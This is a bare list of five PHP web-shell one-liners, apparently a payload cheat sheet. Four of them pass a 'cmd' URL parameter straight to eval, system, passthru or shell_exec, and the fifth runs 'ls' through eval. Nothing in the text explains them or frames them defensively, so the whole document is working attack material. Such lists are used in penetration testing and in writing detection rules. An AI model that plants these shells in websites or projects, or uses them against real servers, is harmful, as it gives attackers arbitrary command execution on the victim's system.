<?php eval($_GET['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval("`ls`"); ?>
